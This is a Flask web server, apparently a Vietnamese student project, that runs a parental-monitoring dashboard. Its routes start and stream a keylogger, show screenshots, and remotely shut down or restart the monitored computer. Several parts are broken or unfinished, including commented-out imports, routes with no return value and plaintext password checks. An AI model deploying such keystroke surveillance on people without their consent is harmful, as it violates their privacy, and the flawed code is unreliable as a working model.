from flask import Flask, request, render_template, Response
import sqlite3
import os
import threading
from server.parent import keyLogger
# from server.receiveImageScreen import screenshots as parent_screenshots
# from server.remoteControl import shutdown_computer, restart_computer


app = Flask(__name__) 
stop_flag = False  # Cờ để kiểm soát việc dừng chương trình
keylogger_thread = None  # Luồng chạy keylogger

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['name']
        password = request.form['pass']

        # Kết nối đến cơ sở dữ liệu SQLite
        conn = sqlite3.connect('PBL.db')
        cursor = conn.cursor()

        # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
        query = "SELECT * FROM user WHERE username = ? AND password = ?"
        try:
            # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
            cursor.execute(query, (username, password))

            # Kiểm tra xem có người dùng hợp lệ trong cơ sở dữ liệu không
            user = cursor.fetchone()

            # Đóng kết nối đến cơ sở dữ liệu
            conn.close()

            if user:
                return render_template('index.html')
            else:
                return "Đăng nhập không thành công. Vui lòng kiểm tra lại tên người dùng và mật khẩu."
        
        except Exception as e:
            return "Đã xảy ra lỗi: " + str(e)

    return render_template('login.html')


@app.route('/keylogger')
def keyLogger_route():
    def generate():
        for data in keyLogger():
            yield data

    dataReponse = Response(generate(), content_type='text/plain')
    return render_template('keylogger.html', dataResponse=dataReponse)

# Route để bắt đầu keylogger
@app.route('/start_keylogger')
def start_keylogger():
    global keylogger_thread
    keylogger_thread = threading.Thread(target=keyLogger)
    keylogger_thread.start()
    return "Keylogger started!"

# Route để dừng keylogger
@app.route('/stop_keylogger')
def stop_keylogger():
    global stop_flag
    global keylogger_thread
    stop_flag = True
    if keylogger_thread:
        keylogger_thread.join()
    return "Keylogger stopped!"

@app.route('/screenshots')
def screenshots_route():

    return render_template('screenshots.html')


@app.route('/remote-control')
def remoteControl():
    # Xử lý logic cho chức năng "điều khiển" ở đây
    return render_template('remote-control.html') 
 
@app.route('/shutdown', methods=['POST'])
def shutdown_route():
    thread = threading.Thread(target=shutdown_computer)
    thread.daemon = True
    thread.start()
    
@app.route('/restart', methods=['POST'])
def restart_route():
    thread = threading.Thread(target=restart_computer)
    thread.daemon = True
    thread.start()
    
@app.route('/app-history')
def appHistory():
    # Xử lý logic cho chức năng "Giám sát bàn phím" ở đây
    return render_template('app-history.html')  


@app.route('/statistics')
def statistics():
    # Xử lý logic cho chức năng "Giám sát bàn phím" ở đây
    return render_template('statistics.html')  


if __name__ == '__main__':
    app.run(debug=True, port=8000)